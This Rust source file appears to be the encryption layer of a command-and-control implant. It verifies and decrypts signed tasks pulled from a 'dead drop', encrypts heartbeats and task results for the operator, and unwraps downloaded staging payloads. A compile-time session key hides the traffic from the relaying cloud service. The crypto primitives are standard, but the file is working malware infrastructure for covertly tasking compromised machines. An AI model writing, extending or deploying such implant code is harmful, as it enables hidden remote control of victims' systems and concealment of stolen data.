//! Hybrid crypto — protocol-compatible with the Stratum server.
//!
//! Command path (server → agent):
//!   payload = base64(GCM(session_key, aes_key)) + ":" + base64(nonce||ct||tag) + ":" + base64(PSS_sig)
//!   PSS_sig = RSA-PSS-SHA256(server_priv_key, SHA256(wrapped_aes || blob))
//!   Agent: verify PSS, GCM-unwrap aes_key with session_key, GCM-decrypt command.
//!
//! Response/heartbeat path (agent → server):
//!   payload = base64(RSA-OAEP-SHA256(pub_key, aes_key)) + ":" + base64(nonce||ct||tag)
//!   Server RSA-OAEP decrypts aes_key, then AES-256-GCM decrypts.
//!
//! RSA scheme: PSS-SHA256 for sign/verify (server→agent); OAEP-SHA256 for encrypt/decrypt (agent→server).
//! AES scheme: AES-256-GCM, 12-byte nonce, 16-byte tag, prepended to ciphertext.
//! session_key: pre-shared 32-byte key (hex) baked at compile time; wraps aes_key so cloud sees opaque blobs.

use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use rand::RngCore;
use zeroize::{Zeroize, Zeroizing};
use rsa::{
    pkcs8::DecodePublicKey,
    pss::{Signature as PssSignature, VerifyingKey},
    oaep::Oaep,
    sha2::Sha256,
    signature::Verifier,
    RsaPublicKey,
};

// ── key type ──────────────────────────────────────────────────────────────────

pub type PubKey = RsaPublicKey;

pub fn load_public_key(pem: &str) -> Result<PubKey, Box<dyn std::error::Error + Send + Sync>> {
    Ok(RsaPublicKey::from_public_key_pem(pem)?)
}

// ── RSA helpers ───────────────────────────────────────────────────────────────

// RSA-PSS-SHA256 verify: used to authenticate commands from the server.
// The server signs (aes_key || blob) with its private key.
fn rsa_pss_verify(pub_key: &PubKey, msg: &[u8], sig_bytes: &[u8]) -> bool {
    let vk  = VerifyingKey::<Sha256>::new(pub_key.clone());
    let sig = match PssSignature::try_from(sig_bytes) {
        Ok(s)  => s,
        Err(_) => return false,
    };
    vk.verify(msg, &sig).is_ok()
}

// RSA-OAEP-SHA256 encrypt with public key: used to seal aes_key for the server.
fn rsa_oaep_encrypt(pub_key: &PubKey, data: &[u8]) -> Option<Vec<u8>> {
    let mut rng = rand::thread_rng();
    pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), data).ok()
}

// ── AES-256-GCM ───────────────────────────────────────────────────────────────

fn gcm_seal(key_bytes: &[u8; 32], plaintext: &[u8]) -> Option<Vec<u8>> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key_bytes));
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher.encrypt(nonce, plaintext).ok()?;
    // Output: nonce(12) || ciphertext+tag
    let mut out = Vec::with_capacity(12 + ct.len());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ct);
    Some(out)
}

fn gcm_open(key_bytes: &[u8; 32], blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 28 { return None; }  // 12 nonce + 16 tag minimum
    let nonce  = Nonce::from_slice(&blob[..12]);
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key_bytes));
    cipher.decrypt(nonce, &blob[12..]).ok()
}

fn slice_to_key32(b: &[u8]) -> Option<[u8; 32]> {
    if b.len() != 32 { return None; }
    let mut k = [0u8; 32];
    k.copy_from_slice(b);
    Some(k)
}

// ── protocol ──────────────────────────────────────────────────────────────────

/// Decrypt and authenticate an incoming command from the dead drop.
/// Returns a parsed `Task` or `None` on any crypto/parse/auth error.
pub fn decrypt_command(raw: &str, pub_key: &PubKey, session_key: &[u8; 32]) -> Option<crate::protocol::Task> {
    // payload = base64(GCM(session_key, aes_key)) : base64(blob) : base64(pss_sig)
    let mut parts = raw.splitn(3, ':');
    let wrapped_b64 = parts.next()?;
    let blob_b64    = parts.next()?;
    let sig_b64     = parts.next()?;

    let wrapped = B64.decode(wrapped_b64).ok()?;
    let blob    = B64.decode(blob_b64).ok()?;
    let sig     = B64.decode(sig_b64).ok()?;

    // Verify PSS signature over (wrapped_aes || blob) before decrypting
    let mut msg = Vec::with_capacity(wrapped.len() + blob.len());
    msg.extend_from_slice(&wrapped);
    msg.extend_from_slice(&blob);
    if !rsa_pss_verify(pub_key, &msg, &sig) {
        #[cfg(windows)]
        unsafe {
            extern "system" { fn OutputDebugStringA(s: *const u8); }
            OutputDebugStringA(b"[DC] PSS verify FAILED\0".as_ptr());
        }
        return None;
    }
    #[cfg(windows)]
    unsafe {
        extern "system" { fn OutputDebugStringA(s: *const u8); }
        OutputDebugStringA(b"[DC] PSS verify ok\0".as_ptr());
    }

    // GCM-unwrap aes_key using the pre-shared session_key.
    // Zeroizing<Vec<u8>> guarantees the key bytes are wiped on all exit paths (Drop).
    let aes_key_bytes = match gcm_open(session_key, &wrapped) {
        Some(k) => Zeroizing::new(k),
        None => {
            #[cfg(windows)]
            unsafe {
                extern "system" { fn OutputDebugStringA(s: *const u8); }
                OutputDebugStringA(b"[DC] GCM unwrap FAILED\0".as_ptr());
            }
            return None;
        }
    };
    let mut key = slice_to_key32(&aes_key_bytes)?;
    let plain   = gcm_open(&key, &blob);
    key.zeroize();
    let text = match String::from_utf8(plain?) {
        Ok(t) => t,
        Err(_) => {
            #[cfg(windows)]
            unsafe {
                extern "system" { fn OutputDebugStringA(s: *const u8); }
                OutputDebugStringA(b"[DC] GCM decrypt ok but UTF8 FAILED\0".as_ptr());
            }
            return None;
        }
    };
    #[cfg(windows)]
    unsafe {
        extern "system" { fn OutputDebugStringA(s: *const u8); }
        OutputDebugStringA(b"[DC] GCM decrypt ok\0".as_ptr());
    }

    serde_json::from_str(&text).ok()
}

/// Encrypt a heartbeat string for the dead drop (agent → server).
pub fn encrypt_heartbeat(heartbeat: &str, pub_key: &PubKey) -> Option<String> {
    let mut key_bytes = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key_bytes);

    let blob    = gcm_seal(&key_bytes, heartbeat.as_bytes());
    let wrapped = rsa_oaep_encrypt(pub_key, &key_bytes);
    key_bytes.zeroize();
    let result = format!("{}:{}", B64.encode(&wrapped?), B64.encode(&blob?));
    Some(result)
}

/// Encrypt a `TaskResponse` as JSON for the dead drop (agent → server).
pub fn encrypt_response(resp: &crate::protocol::TaskResponse, pub_key: &PubKey) -> Option<String> {
    let json = serde_json::to_string(resp).ok()?;
    let mut key_bytes = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key_bytes);

    let blob    = gcm_seal(&key_bytes, json.as_bytes());
    let wrapped = rsa_oaep_encrypt(pub_key, &key_bytes);
    key_bytes.zeroize();
    let result = format!("{}:{}", B64.encode(&wrapped?), B64.encode(&blob?));
    Some(result)
}

/// Decrypt a staging file downloaded from the dead-drop (server → agent direction).
///
/// Binary format:
///   [4 LE: len(wrapped_aes)] [wrapped_aes] [GCM blob = nonce(12)||ct||tag(16)]
///
/// session_key unwraps the AES key; AES key decrypts the file content.
pub fn decrypt_staging(data: &[u8], session_key: &[u8; 32]) -> Option<Vec<u8>> {
    if data.len() < 4 { return None; }
    let wlen = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
    if data.len() < 4 + wlen + 28 { return None; }  // 28 = min GCM blob (12+16)
    let wrapped = &data[4..4 + wlen];
    let blob    = &data[4 + wlen..];

    let aes_key_vec = gcm_open(session_key, wrapped)?;
    let mut aes_key = slice_to_key32(&aes_key_vec)?;
    let plaintext   = gcm_open(&aes_key, blob);
    aes_key.zeroize();
    plaintext
}
